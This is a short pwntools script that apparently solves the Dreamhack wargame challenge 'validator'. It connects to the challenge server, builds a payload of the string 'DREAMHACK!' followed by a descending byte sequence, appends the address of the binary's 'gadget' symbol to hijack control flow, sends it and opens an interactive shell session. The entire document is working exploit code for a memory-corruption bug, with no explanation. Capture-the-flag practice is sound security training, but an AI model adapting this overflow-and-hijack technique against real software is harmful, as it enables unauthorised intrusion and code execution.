from pwn import *

port = 14494
rem = remote("host3.dreamhack.games", port)

elf = ELF("./validator/problem/validator_dist")

payload = b'DREAMHACK!'
for i in range(119, 1, -1):
  payload += chr(i).encode()

payload += p64(elf.symbols['gadget'])

rem.sendline(payload)

rem.interactive()